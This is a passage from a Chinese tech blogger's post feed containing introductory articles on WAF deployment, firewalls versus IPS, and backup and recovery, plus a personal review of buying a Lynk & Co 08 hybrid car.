start="3"><li>旁路反向代理模式</li></ol><p>旁路反向代理模式，可以将Web应用防火墙与Wb服务器置于内网的交换机下，访问Web服务器的所有请求都通过Web应用防火墙流入流出。WAF采用反向代理模式以旁路的方式接入到网络环境中，需要更改网络防火墙的目的映射表，网络防火墙映射WAF的业务口地址，将服务器的IP地址进行隐藏。然而，这种模式下，Web服务器无法获取访问者的真实IP，需要借助HTTP报文中设置相应的字段来表示访问者IP，这样需要修改原有的HTTP报文。如下图所示。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240115/web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E6%97%81%E8%B7%AF%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E9%83%A8%E7%BD%B2.png" alt="WEB应用防火墙旁路反向代理模式部署"></p><center>WEB应用防火墙旁路反向代理模式部署</center><h2 id="五、防火墙和WAF的关系和区别"><a href="#五、防火墙和WAF的关系和区别" class="headerlink" title="五、防火墙和WAF的关系和区别"></a>五、防火墙和WAF的关系和区别</h2><p>防火墙和Web应用防火墙（WAF）都是网络安全产品，但它们的功能和用途有所不同。</p><p>防火墙的主要作用是过滤网络流量，防止未经授权的访问和数据泄漏。它位于网络入口处，对所有进出的数据包进行检测，并根据预设的安全规则来允许或拒绝数据包通过。防火墙可以阻止恶意软件的传播、防止未经授权的访问和数据泄漏，从而保护网络资源的安全。</p><p>而WAF是一种专门针对Web应用程序的防火墙，它部署在Web应用程序的前端，对所有进出的HTTP/HTTPS流量进行深度检测和防护。WAF能够识别并防御常见的Web漏洞和攻击，例如SQL注入、跨站脚本攻击（XSS）、文件包含漏洞等。它还可以防止常见的Web应用程序威胁，如恶意文件上传、远程命令执行等。WAF通过在应用程序层检测和过滤数据，为Web应用程序提供了更具体和针对性的保护。</p><p>具体差异主要体现在以下几个方面：</p><ol><li>定位和部署：防火墙通常位于网络的入口处，用于保护整个网络的安全。它可以过滤网络流量，防止未经授权的访问和数据泄漏。而WAF通常部署在Web应用程序的前端，专门针对Web应用程序进行保护。</li><li>数据检测方式：防火墙主要在网络层检测数据包，并根据预设的安全规则来允许或拒绝数据包通过。而WAF则是在应用程序层检测HTTP/HTTPS流量，可以识别并防御常见的Web漏洞和攻击。</li><li>防御范围：防火墙可以防御各种网络威胁，包括恶意软件、未经授权的访问和数据泄漏等。而WAF则专注于保护Web应用程序的安全，防御常见的Web漏洞和攻击，如SQL注入、跨站脚本攻击（XSS）、文件包含漏洞等。</li><li>定制化和灵活性：WAF通常提供更具体的定制化和灵活性，允许管理员根据实际需求配置和设置规则，更加精准地控制Web应用程序的访问和行为。而防火墙通常有固定的安全规则和配置选项。</li><li>安全漏洞防御：WAF能够防御常见的Web安全漏洞和攻击，这些漏洞可能被黑客利用来攻击Web应用程序。而传统的防火墙可能无法识别和防御这些针对应用层的攻击。</li></ol><p>防火墙和WAF都是网络安全的重要组成部分，但它们的定位和使用范围有所不同。防火墙主要用于保护整个网络的安全，而WAF则专注于保护Web应用程序的安全。在实际应用中，两者可以配合使用，共同增强网络的整体安全性。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>颜值与实力并存-领克08提车和用车感受</title>
      <link href="/posts/a0c94fff/"/>
      <url>/posts/a0c94fff/</url>
      
        <content type="html"><![CDATA[<h2 id="一、选车经过"><a href="#一、选车经过" class="headerlink" title="一、选车经过"></a>一、选车经过</h2><p>第一辆车是11年8月购入的奇瑞A3，1.6手动精英，开了十多年了，不得不说奇瑞的车真是皮实耐用。十二年12万公里了从来没有出过出现过大问题，就换过几次电池、换过雨刮器、右后门的电动车窗的升降机，4条胎换过一次，其他都没有换过。现在开起来还是非常好开，底盘扎实，操控性好，油耗在8、9个左右。唯一的不爽就是手动档在上比较大的陡坡的时候半坡起步乏力，常常要大脚轰油才能不溜坡不熄火。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/%E5%A5%87%E7%91%9EA3.jpg" alt="奇瑞A3"><br>在年初就立了个FLAG，计划两年内换车，目标是新能源混动车型。所以最近一两年都在看新能源的汽车。见<a href="http://xiejava.ishareread.com/posts/c33148ad/" target="_blank" rel="noopener">《写给2025年的自己》</a></p><p>因为是奇瑞的忠实客户，一开始就关注奇瑞的新能源，当时瑞虎8PLUS的PHEV出来的时候就准备开始下手的，结果网上瑞虎8PLUS的PHEV用户体验并不是特别好最初的800客户变成800勇士，虽然说后面问题都解决了的调校越来越好，但让我也不敢贸然下手了。后来看到奇瑞马上要推第二代混动CDM了，所以一直在关注奇瑞的瑶光的CDM和最近比较火的捷途旅行者的CDM，无赖等了又等迟迟不见上市。</p><h2 id="二、选择对比"><a href="#二、选择对比" class="headerlink" title="二、选择对比"></a>二、选择对比</h2><p>目前国内新能源最火的莫过于比亚迪了，关注了比亚迪唐和比亚迪护卫舰07。</p><p>在十二月长沙车展的时候逛了一圈，发现了在领克展台C位的领克08EMP，外观时尚科技，透发着低调的闷骚。接下来就是试驾，在期间我试驾了比亚迪护卫舰07、长安的深蓝S7和领克08EMP。对比下来，护卫舰07最大因为坐姿比较高开起来像开船，内饰中规中矩；深蓝S7是增程式的，内饰极简风格，没有仪表盘只有HUD有点不太适应；对比起来领克08EMP各方面都很均衡比深蓝S7稍大，看上去比护卫舰07小点，三台车都好开，但个人更喜欢领克08EMP底盘紧绷的感觉，外观内饰也是08EMP更符合自己的胃口。领克08EMP就它了！</p><h2 id="三、订车过程"><a href="#三、订车过程" class="headerlink" title="三、订车过程"></a>三、订车过程</h2><p>开始购车前也是想到各个4S店去对比杀价，结果跑了一圈才知道领克现在是网销模式和其他通过4S代销不一样，全国统一价，根本就没得价可谈。<br>2023年12月24日在APP上下的大定，4000元订金，下完订单后就可以在APP上实时看到订单交付状态。<br>我选的是120版本液体灰的halo版，21.58万。12月的政策是厂家优惠6000，全款优惠2000，老车增购补贴4000。</p><h2 id="四、提车过程"><a href="#四、提车过程" class="headerlink" title="四、提车过程"></a>四、提车过程</h2><p>2023年12月24日下的订单，4S店告诉我要等2-4周，结果26号就告诉我刚好来了现车可以提车了。看来领克销量不错，产能提升了。<br>提车的时候在4S店买了保险4441.85+交钱险950+4S店上牌500<br>现在1月份的政策是全款送魅族20pro的手机，后悔太冲动了，没多等几天。但是08很难不让人冲动。<br>提车过程很简单，充分相信领克的质量，都没有怎么仔细看，4S店服务人员讲解了一下如何使用，搞了一个小小的仪式就把车开回来了。</p><h2 id="五、用车感受"><a href="#五、用车感受" class="headerlink" title="五、用车感受"></a>五、用车感受</h2><h3 id="1、外观"><a href="#1、外观" class="headerlink" title="1、外观"></a>1、外观</h3><p>领克的车设计感都很强，从01到09颜值都在线，相对来说我认为09的颜值差了一点。01和05的颜值最好看，08科技时尚，设计可圈可点，很有个性。正面的辨识度很高，无框车门帅得一B。颜值即正义的年代，颜值就是销量的保证。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/08-1.jpg" alt="08-1"><br>有人说正面大灯看上去像蛤蟆，确实有点，但说实话一点不丑<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/08-2.jpg" alt="08-2"><br>08最好看的还是侧颜，立柱式的无边后视镜，原创度非常高，显得立体高级。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/08-3.jpg" alt="08-3"><br>无边后视镜很大视野好颜值高<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/08-4.jpg" alt="08-4"><br>尾部贯穿式尾灯，还带点小造型和前面相呼应，晚上点量后非常漂亮，在锁车的时候有个流水灯效果仪式感满满。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/08-5.jpg" alt="08-5"><br>液体灰，低调高级，远看车不显大，近看还是蛮大的。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240114/08-6.jpg" alt="08-6"></p><h3 id="2、内饰"><a href="#2、内饰" class="headerlink" title="2、内饰"></a>2、内饰</h3><p>内饰颇具小资情调，多彩氛围灯、深灰的Nappa真皮座椅很舒服，全车内部除了HUD部分其他都是软性材质的包裹，摸到的地方都是软的。</p><p>座椅很软，包裹性很好，通风、加热、按摩都给配上了，尤其是四个座位都带了按摩，舒适性照顾到了所有人。</p><p>仪表盘和中控大屏都很清晰，没有实体按键，车机很流畅，我的车机提车的时候就是1.2.0版本的，没有出现网上有人说的车机花屏的情况。语音控制非常好用，可以连续下达多个指令。</p><p>HUD开始几天不太习惯，但用了几天后发现还是不错的。有人说HUD很糊，但是我感觉挺清楚的，我有250度的近视+散光，戴了眼镜后很清晰，一点都不糊。</p><p>哈曼卡顿的音响效果杠杠的，有人说音响重音轰头，我想说的是，我要的就是这种效果，因为我是敲架子鼓的！整个音响环绕效果好给人身临其境的感觉。开车的时候一边听许巍的《像风一样的自由》一边踩着油门，所有的烦恼都抛到了脑后。</p><h3 id="3、行驶"><a href="#3、行驶" class="headerlink" title="3、行驶"></a>3、行驶</h3><p>因为不是专业试车的，谈不出太多专业感受。没有开过其他的豪车没有对比，我的A3的驾驶质感不错了，底盘紧绷，路感清晰，尤其是过坎的时候崩的一下很脆很舒服。08虽然是中型SUV开起来很舒服，底盘调校得很好，也很紧偏硬，方向盘大小适中，方向非常轻，会随着速度变重。由于车大轴距比较大，转弯半径有点大。</p><p>智能巡航超级好用，提了车以后元旦就跑了一次高速来回300多公里，基本上全程开着智能巡航，手扶着方向盘不用想事了，但是时速超过100到120左右，会有明显的感觉是有一股力量在扯着不让跑那么快了，有点像车动力很足但有人在帮你踩刹车的感觉。现在我基本上是上下班堵车就开智能巡航，跟车走走停停由08去自动驾驶了，自己惬意的听着音乐根本就没有了堵车的烦恼。</p><p>虽然是无框车窗，整车在行驶的过程中静谧性很好，由于是混动车大部分场景都是在用电，除了&lt;30km/小时的低速状态有嗡嗡的警示音外基本没有其他声音。超级混动的模式下当发动机启动的时候还是可以感觉到有点声音但是不大。有时候挂停车P档发动机启动给电池充电的时候会有明显的感觉发动机的声音，车内还好，在车外听声音还有点大。跑高速噪音感觉除了反观镜的风噪和胎噪，发动机的声音基本可以忽略，噪声控制得可以毕竟比我的A3好太多了。</p><h3 id="4、油耗"><a href="#4、油耗" class="headerlink" title="4、油耗"></a>4、油耗</h3><p>从买回来到今天半个月的时间，加了两次油1次是200元，1次336元，充了三次电分别是23.88元、19.50元、20.36元，跑了800多公里表显还有827公里，满油满电1000多公里还是可以跑到。说是说120公里的纯电续航，即使是充满电表显也只能跑100公里不到，实际90左右吧。因为还没有装家桩，现在基本是超级混动模式在开，表显油耗在4-5个左右，亏电的情况会要到6-7个左右。（用车环境是在长沙，最近最低气温在6-10度，平均温度在15度所左右）</p><p>充电速度还是挺快的，基本上半个小时左右可以充到80%左右，但是充到100%要1个多小时，前面充得快后面充得慢。</p><h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3><p>领克的APP用起来也不错，很多功能都能在手机上操作。随车是带了一把感应钥匙，一个NFC的卡片钥匙，感应钥匙据说比较耗电。我觉得手机APP的蓝牙钥匙挺好用的，现在我基本上都没有带钥匙了，开门解锁远程遥控，远程可以查看车辆状态，还有行车日志可以看到每次行驶的路径和油耗电耗等信息。1.2.0的版本行车日志电耗显示有问题，所有的显示都是-29.9，昨天推了个1.2.1的版本过来了OTA升级后电耗也可以正常显示了。</p><p>总的来说，领克这个品牌倡导个性、开放、互联符合我的调性，领克08EMP颜值高、有个性、驾驶质感好、科技感满满、舒适性也不错、空间也足够，有这样的颜值和产品力后面的销量应该不会低。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 产品 </category>
          
          <category> 产品体验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 产品体验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识防火墙</title>
      <link href="/posts/afc06be4/"/>
      <url>/posts/afc06be4/</url>
      
        <content type="html"><![CDATA[<p>防火墙是一种网络安全产品，它设置在不同网络（如可信任的企业内部网和不可信的公共网）或网络安全域之间，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护。</p><h2 id="一、什么是防火墙"><a href="#一、什么是防火墙" class="headerlink" title="一、什么是防火墙"></a>一、什么是防火墙</h2><p>防火墙指的是一个由软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的边界上构造的保护屏障。它可通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护。在逻辑上，防火墙是一个分离器，一个限制器，也是一个分析器，有效地监控了内部网和Internet之间的任何活动，保证了内部网络的安全。防火墙（Firewall），是一种硬件设备或软件系统，主要架设在内部网络和外部网络间，为了防止外界恶意程式对内部系统的破坏，或者阻止内部重要信息向外流出，有双向监督功能。防火墙主要由服务访问规则、验证工具、包过滤和应用网关4个部分组成。</p><h2 id="二、防火墙的主要功能"><a href="#二、防火墙的主要功能" class="headerlink" title="二、防火墙的主要功能"></a>二、防火墙的主要功能</h2><ol><li>创建一个阻塞点<br>防火墙在一个公司内部网络和外部网络间建立一个检查点，这种实现要求所有的流量都要通过这个检查点。一旦这些检查点清楚地建立，防火墙设备就可以监视，过滤和检查所有进来和出去的流量。这样一个检查点，在网络安全行业中称之为“阻塞点”。通过强制所有进出流量都通过这些检查点，网络管理员可以集中在较少的地方来实现安全目的。</li><li>隔离不同网络，防止内部信息的外泄<br>这是防火墙的最基本功能，它通过隔离内、外部网络来确保内部网络的安全。使用防火墙就可以隐蔽那些透漏内部细节如Finger，DNS等服务。防火墙可以同样阻塞有关内部网络中的DNS信息，这样一台主机的域名和IP地址就不会被外界所了解。</li><li>强化网络安全策略<br>通过以防火墙为中心的安全方案配置，能将所有安全软件(如口令、加密、身份认证、审计等)配置在防火墙上。与将网络安全问题分散到各个主机上相比，防火墙的集中安全管理更经济。各种安全措施的有机结合，更能有效地对网络安全性能起到加强作用。</li><li>有效地审计和记录内、外部网络上的活动<br>防火墙可以对内、外部网络存取和访问进行监控审计。如果所有的访问都经过防火墙，那么，防火墙就能记录下这些访问并进行日志记录，同时也能提供网络使用情况的统计数据。当发生可疑动作时，防火墙能进行适当的报警，并提供网络是否受到监测和攻击的详细信息。这为网络管理人员提供非常重要的安全管理信息，可以使管理员清楚防火墙是否能够抵挡攻击者的探测和攻击，并且清楚防火墙的控制是否充足。</li></ol><h2 id="三、防火墙的主要类型"><a href="#三、防火墙的主要类型" class="headerlink" title="三、防火墙的主要类型"></a>三、防火墙的主要类型</h2><p>按照防火墙实现技术的不同可以将防火墙为以下几种主要的类型。</p><ol><li>包过滤防火墙<br>数据包过滤是指在网络层对数据包进行分析、选择和过滤。选择的数据是系统内设置的访问控制表（又叫规则表），规则表制定允许哪些类型的数据包可以流入或流出内部网络。通过检查数据流中每一个IP数据包的源地址、目的地址、所用端口号、协议状态等因素或它们的组合来确定是否允许该数据包通过。包过滤防火墙一般可以直接集成在路由器上，在进行路由选择的同时完成数据包的选择与过滤，也可以由一台单独的计算机来完成数据包的过滤。</li><li>应用代理防火墙<br>应用代理防火墙能够将所有跨越防火墙的网络通信链路分为两段，使得网络内部的客户不直接与外部的服务器通信。防火墙内外计算机系统间应用层的连接由两个代理服务器之间的连接来实现。有点是外部计算机的网络链路只能到达代理服务器，从而起到隔离防火墙内外计算机系统的作用：缺点是执行速度慢，操作系统容易遭到攻击。</li><li>状态检测防火墙<br>状态检测防火墙又叫动态包过滤防火墙。状态检测防火墙在网络层由一个检查引擎截获数据包并抽取出与应用状态有关的信息。一次作为数据来决定该数据包是接受还是拒绝。检查引擎维护一个动态的状态信息表并对后续的数据包进行检查，一旦发现任何连接的参数有意外变化，该连接就被终止。状态检测防火墙克服了包过滤防火墙和应用代理防火墙的局限性，能够根据协议、端口及P数据包的源地址、目的地址的具体情况来决定数据包是否可以通过。</li></ol><h2 id="四、部署方式"><a href="#四、部署方式" class="headerlink" title="四、部署方式"></a>四、部署方式</h2><p>防火墙在实际的部署过程中主要有三种模式可供选择，这三种模式分别是：基于TCP/IP协议三层的NAT模式、基于TCP/IP协议三层的路由模式、基于二层协议的透明模式。</p><ol><li>NAT模式<br>当Juniper防火墙入口接口（“内网端口”）处于NAT模式时，防火墙将通往Untrust区（外网或者公网）的IP数据包包头中的两个组件进行转换：源IP地址和源端口号。防火墙使用Untrust区（外网或者公网）接口的IP地址替换始发端主机的源IP地址；同时使用由防火墙生成的任意端口号替换源端口号。</li><li>Route-路由模式<br>当Juniper防火墙接口配置为路由模式时，防火墙在不同安全区间（例如：Trust/Utrust/DMZ）转发信息流时IP数据包包头中的源地址和端口号保持不变（除非明确采用了地址翻译策略）。与NAT模式下不同，防火墙接口都处于路由模式时，防火墙不会自动实施地址翻译；与透明模式下不同，当防火墙接口都处于路由模式时，其所有接口都处于不同的子网中。</li><li>透明模式<br>当Juniper防火墙接口处于“透明”模式时，防火墙将过滤通过的IP数据包，但不会修改IP数据包包头中的任何信息。防火墙的作用更像是处于同一VLAN的2层交换机或者桥接器，防火墙对于用户来说是透明的。</li></ol><h2 id="五、局限性"><a href="#五、局限性" class="headerlink" title="五、局限性"></a>五、局限性</h2><ol><li>不能防止源于内部的攻击，不提供对内部的保护；</li><li>不能防病毒；</li><li>不能根据网络被恶意使用和攻击的情况动态调整自己的策略；</li><li>本身的防攻击能力不够，容易成为被攻击的首要目标。</li></ol><h2 id="六、防火墙与IPS的区别与关系"><a href="#六、防火墙与IPS的区别与关系" class="headerlink" title="六、防火墙与IPS的区别与关系"></a>六、防火墙与IPS的区别与关系</h2><p>防火墙和IPS（入侵防御系统）是两种不同的网络安全产品，它们在保护网络方面有不同的侧重点和功能。</p><p>防火墙主要用于控制网络访问，它可以过滤掉不安全的服务和非法用户，防止入侵者接近防御设施，是第一道的防线。防火墙部署在网络边界，可以隔离内外网，并对进出网络的数据流进行过滤和监测。防火墙通常基于预设的安全策略来允许或拒绝数据流的进出，可以防御常见的网络攻击，但对于一些未知或不断变化的威胁可能效果有限。</p><p>而IPS是一种主动的网络安全防御系统，它可以在网络中实时检测和防御恶意行为。IPS可以检测到攻击者的行为，并在攻击对系统造成损害之前及时阻止。IPS通过分析网络流量和检测异常行为来发现攻击，并可以采取措施来隔离攻击源、修复受损系统、记录攻击信息等。由于IPS需要实时监测网络流量，因此对于大规模的网络流量可能会对性能产生一定影响。</p><p>防火墙和IPS在网络安全中各有侧重，但可以相互配合使用。防火墙可以过滤掉大部分的常见威胁，而IPS可以补充防火墙的不足，提供更深入的检测和防御能力。同时，IPS可以检测和防御那些已经绕过防火墙的攻击，提高整体的网络安全性。</p><h2 id="七、防火墙如何提升防护能力"><a href="#七、防火墙如何提升防护能力" class="headerlink" title="七、防火墙如何提升防护能力"></a>七、防火墙如何提升防护能力</h2><p>防火墙应对不断变化的网络威胁的方法主要包括以下几个方面：</p><ol><li>动态更新和升级：防火墙可以通过动态更新和升级来应对不断变化的网络威胁。厂商会不断发布新的安全漏洞和威胁情报，防火墙可以通过定期更新和升级来修补这些漏洞，并增强对新型威胁的防御能力。</li><li>应用层防护：随着网络威胁的变化，防火墙需要具备应用层防护能力，能够识别和拦截各种应用层的攻击，如SQL注入、跨站脚本等。</li><li>入侵检测与防御：防火墙集成了入侵检测与防御功能，能够实时检测网络流量中的异常行为，并采取相应的防御措施。通过与安全设备的联动，可以进一步增强对网络威胁的应对能力。</li><li>智能分析：借助大数据和人工智能技术，防火墙可以进行智能分析，自动识别和分类网络流量中的威胁，并提供可视化的威胁报表。这有助于企业及时发现和处理潜在的安全风险。</li><li>云安全技术：随着云计算的普及，云安全也成为防火墙的重要功能之一。防火墙需要具备云安全技术，能够防御来自云端的安全威胁，保护企业数据的安全。</li></ol><p>防火墙通过动态更新和升级、应用层防护、入侵检测与防御、智能分析和云安全技术等手段，可以应对不断变化的网络威胁。但需要注意的是，防火墙只是网络安全的一部分，企业还需要结合其他安全措施，如数据加密、身份认证等，来全面提升网络安全防护能力。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之备份恢复技术</title>
      <link href="/posts/71d4ad9f/"/>
      <url>/posts/71d4ad9f/</url>
      
        <content type="html"><![CDATA[<p>随着计算机和网络的不断普及，人们更多的通过网络来传递大量信息。在网络环境下，还有各种各样的病毒感染、系统故障、线路故障等，使得数据信息的安全无法得到保障。由于安全风险的动态性，安全不是绝对的，信息系统不可能保证不出现安全事故，因此，一旦出现安全事件造成信息系统中断或者数据丢失，如果事先采取了必要的备份准备并及时启用，能够最小程度的减少系统重构时间和对业务中断的影响。备份恢复技术是安全防御体系中的重要组成部分，旨在保护数据安全，防止数据丢失或损坏，提高企业的数据安全性和业务连续性水平。</p><h2 id="一、备份恢复的基本概念"><a href="#一、备份恢复的基本概念" class="headerlink" title="一、备份恢复的基本概念"></a>一、备份恢复的基本概念</h2><p>备份恢复的基本概念主要包括备份和恢复两个方面。备份是指将数据或系统进行复制和存储的过程，以便在数据丢失或损坏时能够从备份中恢复。<br>恢复则是指当数据或系统出现问题时，通过备份数据进行数据恢复或系统重建的过程。</p><h2 id="二、备份恢复技术的分类"><a href="#二、备份恢复技术的分类" class="headerlink" title="二、备份恢复技术的分类"></a>二、备份恢复技术的分类</h2><p>备份恢复技术有多种分类和应用场景，可以根据实际需求进行选择和应用。常见的备份恢复技术包括数据备份技术、灾难恢复技术、容灾技术、备份与恢复管理技术、数据归档技术和文件系统快照技术等。</p><ol><li>数据备份技术：是指定期对重要数据或全部数据复制和存储，以防止数据丢失或损坏。数据备份可以分为完整备份、增量备份、差异备份等。</li><li>灾难恢复技术：是指在发生灾难事件时，通过事先制定的灾难恢复计划和流程，快速恢复业务运行。灾难恢复技术包括数据备份、系统恢复、业务恢复等方面的内容。</li><li>容灾技术：是指通过建立异地容灾中心，将重要数据实时或定时复制到容灾中心，确保在主中心发生故障时，数据仍能保持可用性和完整性。容灾技术包括数据同步、异步复制、数据验证等方面的内容。</li><li>备份与恢复管理技术：是指定期对备份数据进行验证和测试，确保备份数据的可用性和完整性。同时，建立完善的备份与恢复管理制度，规范备份与恢复操作，确保备份和恢复工作的顺利进行。</li><li>数据归档技术：是指将不再经常使用的数据迁移到归档设备上，以释放存储空间并降低管理成本。归档设备可以是磁带库、光盘库等。</li><li>文件系统快照技术：是指利用文件系统快照技术，对文件系统进行快速备份。快照技术可以捕获文件系统在某一时刻的状态，以便在发生问题时迅速恢复数据。<br>这些技术可以根据实际需求进行选择和应用，以确保数据的完整性和可用性，提高企业的业务连续性水平，降低企业的风险和成本。</li></ol><h2 id="三、备份恢复的能力等级"><a href="#三、备份恢复的能力等级" class="headerlink" title="三、备份恢复的能力等级"></a>三、备份恢复的能力等级</h2><p>系统备份恢复能力也是信息系统一种重要的安全能力。2007年国家针对备份恢复发布了国家标准《GB/T 20988-2007 信息安全技术 信息系统灾难恢复规范》，《规范》将灾难恢复能力划分为6级：</p><ul><li>等级一：基本支持。要求数据备份系统能够保证每周至少进行一次数据备份，备份介质能够提供场外存放。对于备用数据处理系统和备用网络系统，没有具体要求。</li><li>等级二：备用场地支持。在满足等级一的条件基础上，要求配备灾难恢复所需的部分数据处理设备，或灾难发生后能在预定时间内调配所需的数据处理设备到备用场地；要求配备部分通信线路和相应的网络设备，或灾难发生后能在预定时间内调配所需的通信线路和网络设备到备用场地。</li><li>等级三：电子传输和设备支持。要求每天至少进行一次完全数据备份，备份介质场外存放，同时每天多次利用通信网络将关键数据定时批量传送至备用场地。配备灾难恢复所需的部分数据处理设备、通信线路和相应的网络设备。</li><li>等级四：电子传输及完整设备支持。在等级三的基础上，要求配置灾难恢复所需的所有数据处理设备、通行线路和相应的网络设备，并且处于就绪或运行状态。</li><li>等级五：实时数据传输及完整设备支持。除要求每天至少进行一次完全数据备份，备份介质场外存放外，还要求采用远程数据复制技术，利用通信网络将关键数据实时复制到备用场地。</li><li>等级六：数据零丢失和远程集群支持。要求实现远程实时备份，数据零丢失；备用数据处理系统具备与生产数据处理系统一致的处理能力，应用软件是“集群的”，可实时无缝切换。</li></ul><p>由此可见，灾难恢复能力等级越高，对于信息系统的保护效果越好，但同时成本也会急剧上升。</p><h2 id="四、备份恢复的类型"><a href="#四、备份恢复的类型" class="headerlink" title="四、备份恢复的类型"></a>四、备份恢复的类型</h2><p>备份恢复的基本原理是确保数据的完整性和可用性，防止数据丢失或损坏。在备份过程中，需要对重要数据或全部数据进行拷贝和存储，可以选择不同的备份策略，如完整备份、增量备份、差异备份等，以满足不同场景的需求。在恢复过程中，需要使用备份数据来恢复受损的数据或系统，确保业务能够正常运行。<br>备份通常可以分成下面的这三种类型：</p><h3 id="1、完全备份"><a href="#1、完全备份" class="headerlink" title="1、完全备份"></a>1、完全备份</h3><p>完全备份就是将系统中所有的数据都通过备份进程备份。完全备份需要的时间相比其他集中备份方式要长，但是故障发生时，恢复时间非常快。</p><h3 id="2、差异备份"><a href="#2、差异备份" class="headerlink" title="2、差异备份"></a>2、差异备份</h3><p>通常，系统管理员会每周定期作完全备份，在一周的其他时间针对与完全备份的差异部分作差异备份。<br>这种备份方法的恢复时间较长，我们不但要从全备份中恢复数据，还需要将每天的变化量恢复到系统中。</p><h3 id="3、增量备份"><a href="#3、增量备份" class="headerlink" title="3、增量备份"></a>3、增量备份</h3><p>增量备份是每周定期进行完全备份，每天增加备份当天的数据变化，对于备份时间，增量备份需要的时间最短，但是，回复时间较长且较为复杂。在恢复过程中，我们不但需要恢复第一次的完全备份，还需要使用每天变化量的备份，一次恢复一天的数据，直到最近的一次所做的增量备份为止。</p><h2 id="五、数据备份的方式"><a href="#五、数据备份的方式" class="headerlink" title="五、数据备份的方式"></a>五、数据备份的方式</h2><h3 id="1、远程镜像"><a href="#1、远程镜像" class="headerlink" title="1、远程镜像"></a>1、远程镜像</h3><p>远程镜像技术在主数据中心和数据备份中心之间的数据备份过程中使用。镜像是在两个或多个磁盘或磁盘子系统上产生同一个数据的镜像视图的信息存储过程，一个叫主镜像系统，另一个叫从镜像系统。按主从镜像存储系统所处的位置可分为本地镜像和远程镜像。远程镜像又叫远程复制，是容灾备份的核心技术，同时也是保持远程数据同步和实现灾难恢复的基础。远程镜像按请求镜像的主机是否需要远程镜像站点的确认信息，又可分为同步远程镜像和异步远程镜像。</p><p>同步远程镜像（同步复制技术）是指通过远程镜像软件，将本地数据以完全同步的方式复制到异地，每一本地的I/O事务均需等待远程复制的完成确认信息，方予以释放。同步镜像使远程拷贝总能与本地机要求复制的内容相匹配。当主站点出现故障时，用户的应用程序切换到备份的替代站点后，被镜像的远程副本可以保证业务继续执行而没有数据的丢失。但它存在往返传播造成延时较长的缺点，只限于在相对较近的距离上应用。</p><p>异步远程镜像（异步复制技术）保证在更新远程存储视图前完成向本地存储系统的基本I/O操作，而由本地存储系统提供给请求镜像主机的I/O操作完成确认信息。远程的数据复制是以后台同步的方式进行的，这使本地系统性能受到的影响很小，传输距离长（可达1000公里以上），对网络带宽要求小。但是，许多远程的从属存储子系统的写没有得到确认，当某种因素造成数据传输失败，可能出现数据一致性问题。为了解决这个问题，目前大多采用延迟复制的技术，即在确保本地数据完好无损后进行远程数据更新。</p><h3 id="2、快照技术"><a href="#2、快照技术" class="headerlink" title="2、快照技术"></a>2、快照技术</h3><p>快照是通过软件对要备份的磁盘子系统的数据快速扫描，建立一个要备份数据的快照逻辑单元号LUN和快照cache。在快速扫描时，把备份过程中即将要修改的数据块同时快速拷贝到快照cache中。<br>快照LUN是一组指针，它指向快照cache和磁盘子系统中不变的数据块（在备份过程中）。在正常业务进行的同时，利用快照LUN实现对原数据的一个完全的备份。它可使用户在正常业务不受影响的情况下（主要指容灾备份系统），实时提取当前在线业务数据。其“备份窗口”接近于零，可增加系统业务的连续性，为实现系统真正的7×24运转提供了保证。</p><h3 id="3、互连技术"><a href="#3、互连技术" class="headerlink" 